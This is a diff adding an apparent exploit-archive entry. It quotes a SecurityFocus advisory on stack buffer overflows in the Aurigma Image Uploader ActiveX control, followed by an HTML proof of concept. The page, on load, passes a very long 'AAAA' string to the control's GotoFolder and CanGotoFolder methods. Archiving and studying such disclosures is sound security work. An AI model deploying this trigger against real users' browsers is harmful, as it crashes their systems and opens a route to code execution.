@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/26537/info
+
+Aurigma Image Uploader ActiveX control is prone to multiple stack-based buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied data.
+
+Successfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.
+
+Versions prior to Aurigma Image Uploader 4.5.70 are affected.
+
+UPDATE (November 26, 2007): Reports indicate that this issue occurs because of a buffer-overflow issue that affects a Win32API method. This has not been confirmed. We will update this BID as more information emerges. 
+
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+     while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("Aurigma.ImageUploader.4.1"); //{6E5E167B-1566-4316-B27F-0DDAB3484CF7}
+      obj.GotoFolder(s);
+      obj.CanGotoFolder(s);
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+ </body>
+</html>
